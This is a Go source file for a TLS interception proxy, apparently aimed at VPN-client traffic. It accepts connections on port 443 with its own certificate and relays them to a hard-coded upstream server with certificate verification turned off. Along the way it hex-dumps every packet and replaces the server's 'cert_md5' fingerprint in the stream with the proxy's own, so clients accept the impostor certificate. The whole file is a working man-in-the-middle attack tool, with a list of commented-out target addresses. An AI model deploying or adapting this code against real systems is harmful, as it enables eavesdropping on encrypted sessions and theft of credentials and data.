
package main
import (
        "io"
        "log"
        "net"
        "fmt"
        "os"
	"bytes"
        "crypto/tls"
        "crypto/rand"
	"encoding/hex"
)

func checkError(err error) {
        if err != nil {
                fmt.Fprintf(os.Stderr, "Fatal error: %s", err.Error())
                os.Exit(1)
        }
}

/* slower, by we can print/log everything */
func myrawcopy(dst,src net.Conn, direction string) (written int64, err error) {
    buf := make([]byte, 32*1024)
    realcert := []byte("cert_md5=90ab8294b0c3fe0b84af563bb4adf37c")
    mycert := []byte("cert_md5=be9ac5a0dac73483037315ac51b81beb")
//      realcert := []byte("Upgrade: IF-T/TLS 1.0")
//      mycert := []byte("xxgrade: xx-T/TLS 1.0")
    for {
        nr, er := src.Read(buf)
        if nr > 0 {
	   buf := bytes.Replace(buf, realcert, mycert, 1)
                        fmt.Printf("Packet %s:\n%s",direction, hex.Dump(buf[0:nr]));
            nw, ew := dst.Write(buf[0:nr])
            if nw > 0 {
                written += int64(nw)
            }
            if ew != nil {
                err = ew
                break
            }
            if nr != nw {
                err = io.ErrShortWrite
                break
            }
        }
        if er == io.EOF {
            break
        }
        if er != nil {
            err = er
            break
        }
    }
    return written, err
}

func myiocopy(dst net.Conn, src net.Conn, direction string){
        myrawcopy(dst, src, direction)
        //io.Copy(dst,src);
        dst.Close();
        src.Close();
}

func handleclient(c net.Conn){
        config := tls.Config{InsecureSkipVerify: true}
//        conn, err := tls.Dial("tcp", "198.47.29.135:443", &config)
//        conn, err := tls.Dial("tcp", "109.226.0.68:443", &config)
//        conn, err := tls.Dial("tcp", "104.245.214.18:443", &config)
//        conn, err := tls.Dial("tcp", "153.9.169.10:443", &config)
//        conn, err := tls.Dial("tcp", "10.23.232.22:443", &config)
        conn, err := tls.Dial("tcp", "10.25.97.209:443", &config)
        checkError(err)

        go myiocopy(conn,c, "client->server")

        //io.Copy(c, conn)
        myrawcopy(c, conn, "server->client")
        c.Close()
        conn.Close();
}

func main() {
        cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
        if err != nil {
                log.Fatalf("server: loadkeys: %s", err)
        }
        config := tls.Config{Certificates: []tls.Certificate{cert}}
        config.Rand = rand.Reader
        service := "0.0.0.0:443"
        listener, err := tls.Listen("tcp", service, &config)
        if err != nil {
                log.Fatalf("server: listen: %s", err)
        }
        log.Printf("server: listening on %s for https, connects to https://10.3.0.124:443",service)
        for {
                conn, err := listener.Accept()
                if err != nil {
                        log.Printf("server: accept: %s", err)
                        break
                }
                defer conn.Close()
                log.Printf("server: accepted from %s", conn.RemoteAddr())
                go handleclient(conn)
        }
}

